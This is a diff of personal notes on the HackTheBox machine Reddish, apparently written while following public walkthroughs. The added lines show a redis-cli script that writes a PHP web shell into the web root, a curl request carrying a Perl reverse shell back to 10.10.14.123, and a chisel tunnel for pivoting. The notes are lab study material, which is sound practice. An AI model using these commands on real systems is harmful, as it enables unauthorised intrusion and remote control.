@@ -21,7 +21,7 @@ Learnt:
 8. Favicons were a larger indication of where I am capable of expanding further intuitively as it boils down too:
 	1. What is in front of you - what can I use to solve X - not what could be in front of you 
 	2. What sticks out on a blank screen with Favicon and response error code.
-9. The power of `nohup`  or no hangup and `&` 
+9. The power of `nohup`   and `&` 
 Beyond Root:
 - Omni-Tool-Usage for port redirection - but demostrate with Ubuntu server for tools cannot just install onto the box 
 - Clarity over all possible options 
@@ -450,23 +450,65 @@ save
 # Then do not be an idiot and save it...
 # 0xDF 
 
+# 0xdfreddishRCE.sh
 #!/bin/bash
 
 # https://0xdf.gitlab.io/2019/01/26/htb-reddish.html#webshell
 redis-cli -h 127.0.0.1 flushall
 redis-cli -h 127.0.0.1 -x set subscribetoippsec "<? system($_REQUEST['cmd']); ?>"
-redis-cli -h 127.0.0.1 config set dbfilename cmd.php
+redis-cli -h 127.0.0.1 config set dbfilename "cmd.php
 redis-cli -h 127.0.0.1 config set dir /var/www/html
 redis-cli -h 127.0.0.1 save
 exit
 ```
-2. 
+2. And try
 ```bash
 curl -X POST http://localhost:10001/cmd.php -d "cmd=perl%20-e%20'use%20Socket;$i=%2210.10.14.123%22;$p=8005;socket(S,PF_INET,SOCK_STREAM,getprotobyname(%22tcp%22));if(connect(S,sockaddr_in($p,inet_aton($i))))%7Bopen(STDIN,%22%3E&S%22);open(STDOUT,%22%3E&S%22);open(STDERR,%22%3E&S%22);exec(%22/bin/bash%20-i%22);%7D;'" --output -
 ```
 
+## Day 10
 
+But I ran into issues and researched how I was to accomplish this.
 
+Ippsec uses Chisel - Local Pivot
+```bash
+# Full command for local pivot
+nohup ./chisel client 10.10.14.123:10000 10003:127.0.0.1:10003 &
+# Breakdown:
+# Create another 
+chisel client 
+# pointing to our chisel server:
+10.10.14.123
+# on port
+10000 
+# Then open locally ON REDDISH:
+10003:
+# And for the server open:
+127.0.0.1:10003
+# Traffic from port 10003 on Reddish will tunnel back to
+127.0.0.1:10003
+```
+
+This is so that we catch the reverse shell from the NodeRed and forward back to 127.0.0.1:10003.
+
+My issue was that I could access it, but it could not access me. To connect up some Azure Vnet knowledge here for revision Peering require connections to be made twice, once in each direction between two vnets.
+
+Fixed the RCE 
+```bash
+# 0xDF 
+# cmd.php:
+ "<? system($_REQUEST['cmd']); ?>"
+# 0xdfreddishRCE.sh
+#!/bin/bash
+
+# https://0xdf.gitlab.io/2019/01/26/htb-reddish.html#webshell
+redis-cli -h 127.0.0.1 flushall
+redis-cli -h 127.0.0.1 -x set subscribetoippsecandread0xdf
+redis-cli -h 127.0.0.1 config set dir /var/www/html/
+redis-cli -h 127.0.0.1 config set dbfilename "cmd.php"
+redis-cli -h 127.0.0.1 save
+exit
+```
 
 
 ## Finally a Foothold
@@ -499,7 +541,9 @@ Back to Reddish
 We do not have access to some parts of this box
 [0xdf uses SOCAT](https://0xdf.gitlab.io/2019/01/26/htb-reddish.html#www--redis-containers) 
 
-1
+
+
+
 
 #### Use Node RED to understand Virtual networking 
 
